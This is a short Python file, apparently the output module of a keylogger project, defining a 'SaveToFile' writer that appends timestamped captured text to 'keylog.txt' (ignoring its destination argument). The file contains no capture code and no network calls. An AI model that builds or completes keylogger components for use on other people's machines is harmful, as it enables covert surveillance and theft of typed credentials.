from datetime import datetime

from writers.base import IWriter


class SaveToFile(IWriter):

    def __init__(self, destination: str = "keylog.txt"):
        super().__init__(destination)

    def send_data(self, data, machine_name=""):
        with open("keylog.txt", "a", encoding="utf-8") as f:
            for ts, arr_text in data:
                f.write(f"{datetime.fromtimestamp(ts)}\n{arr_text}\n\n")
        return 1
